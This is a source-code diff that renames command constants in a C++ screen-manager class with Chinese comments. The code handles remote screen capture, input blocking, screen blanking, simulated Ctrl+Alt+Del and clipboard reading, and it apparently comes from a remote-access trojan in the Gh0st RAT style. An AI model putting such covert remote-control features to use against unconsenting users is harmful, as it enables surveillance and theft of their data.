@@ -124,48 +124,48 @@ void CScreenManager::SetAeroComposition(UINT uCompositionAction)
 void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 {
     switch (lpBuffer[0]) {
-    case COMMAND_NEXT1:
+    case COMMAND_NEXT:
         // 通知内核远程控制端对话框已打开，WaitForDialogOpen可以返回
         NotifyDialogIsOpen();
         break;
-    case COMMAND_AERO_DISABLE1:
+    case COMMAND_AERO_DISABLE:
         SetAeroComposition(FALSE);
         break;
-    case COMMAND_AERO_ENABLE1:
+    case COMMAND_AERO_ENABLE:
         SetAeroComposition(TRUE);
         break;
-    case COMMAND_SCREEN_RESET1:
+    case COMMAND_SCREEN_RESET:
         ResetScreen(*(LPBYTE)&lpBuffer[1]);
         break;
-    case COMMAND_ALGORITHM_RESET1:
+    case COMMAND_ALGORITHM_RESET:
         m_bAlgorithm = *(LPBYTE)&lpBuffer[1];
         m_pScreenSpy->setAlgorithm(m_bAlgorithm);
         break;
-    case COMMAND_SCREEN_CTRL_ALT_DEL1:
+    case COMMAND_SCREEN_CTRL_ALT_DEL:
         ::SimulateCtrlAltDel();
         break;
-    case COMMAND_SCREEN_CONTROL1:
+    case COMMAND_SCREEN_CONTROL:
         if (m_bIsBlockInput)
             BlockInput(FALSE);       // 远程仍然可以操作
         ProcessCommand(lpBuffer + 1, nSize - 1);
         if (m_bIsBlockInput)
             BlockInput(m_bIsBlockInput);
         break;
-    case COMMAND_SCREEN_BLOCK_INPUT1: // CtrlThread里锁定
+    case COMMAND_SCREEN_BLOCK_INPUT: // CtrlThread里锁定
         InterlockedExchange((LPLONG)&m_bIsBlockInput, *(LPBYTE)&lpBuffer[1]);
         BlockInput(m_bIsBlockInput);
         break;
-    case COMMAND_SCREEN_BLANK1:
+    case COMMAND_SCREEN_BLANK:
         InterlockedExchange((LPLONG)&m_bIsBlankScreen, *(LPBYTE)&lpBuffer[1]);
         break;
-    case COMMAND_SCREEN_CAPTURE_LAYER1:
+    case COMMAND_SCREEN_CAPTURE_LAYER:
         InterlockedExchange((LPLONG)&m_bIsCaptureLayer, *(LPBYTE)&lpBuffer[1]);
         m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);
         break;
-    case COMMAND_SCREEN_GET_CLIPBOARD1:
+    case COMMAND_SCREEN_GET_CLIPBOARD:
         SendLocalClipboard();
         break;
-    case COMMAND_SCREEN_SET_CLIPBOARD1:
+    case COMMAND_SCREEN_SET_CLIPBOARD:
         UpdateLocalClipboard((char *)lpBuffer + 1, nSize - 1);
         break;
     default:
@@ -177,7 +177,7 @@ void CScreenManager::sendBitmapInfo()
 {
     DWORD	dwBytesLength = 1 + m_pScreenSpy->getBitmapInfoSize();
     LPBYTE	lpBuffer = (LPBYTE)VirtualAlloc(NULL, dwBytesLength, MEM_COMMIT, PAGE_READWRITE);
-    lpBuffer[0] = TOKEN_BITMAPINFO1;
+    lpBuffer[0] = TOKEN_BITMAPINFO;
     memcpy(lpBuffer + 1, m_pScreenSpy->getBitmapInfo(), dwBytesLength - 1);
     Send(lpBuffer, dwBytesLength);
     VirtualFree(lpBuffer, 0, MEM_RELEASE);
@@ -196,7 +196,7 @@ void CScreenManager::sendFirstScreen()
     if (lpBuffer == NULL)
         return;
 
-    lpBuffer[0] = TOKEN_FIRSTSCREEN1;
+    lpBuffer[0] = TOKEN_FIRSTSCREEN;
     memcpy(lpBuffer + 1, lpFirstScreen, dwBytes);
 
     Send(lpBuffer, dwBytesLength);
@@ -216,7 +216,7 @@ void CScreenManager::sendNextScreen()
     if (lpBuffer == NULL)
         return;
 
-    lpBuffer[0] = TOKEN_NEXTSCREEN1;
+    lpBuffer[0] = TOKEN_NEXTSCREEN;
     memcpy(lpBuffer + 1, lpNextScreen, dwBytes);
 
     Send(lpBuffer, dwBytesLength);
@@ -403,7 +403,7 @@ void CScreenManager::SendLocalClipboard()
     int	nPacketLen = GlobalSize(hglb) + 1;
     LPSTR lpstr = (LPSTR) GlobalLock(hglb);
     LPBYTE	lpData = new BYTE[nPacketLen];
-    lpData[0] = TOKEN_CLIPBOARD_TEXT1;
+    lpData[0] = TOKEN_CLIPBOARD_TEXT;
     memcpy(lpData + 1, lpstr, nPacketLen - 1);
     ::GlobalUnlock(hglb);
     ::CloseClipboard();
